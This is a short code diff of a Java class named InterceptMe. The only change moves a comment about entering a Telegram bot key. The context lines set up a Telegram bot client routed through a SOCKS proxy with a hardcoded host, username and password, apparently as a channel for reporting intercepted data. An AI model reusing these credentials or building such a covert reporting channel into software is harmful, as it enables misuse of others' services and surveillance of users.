@@ -185,10 +185,10 @@ public final class InterceptMe {
         try {
             //!!!Please modify this vars!!!
             int chatId = 0;
+            //enter your telegram bot key
             String botKey = null;
             if (chatId==0 || botKey==null)
                 return;
-            //enter your telegram bot key
             Telegram telegram = new Telegram(botKey);
             //24.05.2020 this proxy is ok
             telegram.setProxyParams(Proxy.Type.SOCKS, "orbtl.s5.opennetwork.cc", 999, "369389927", "ElzXFZlC");
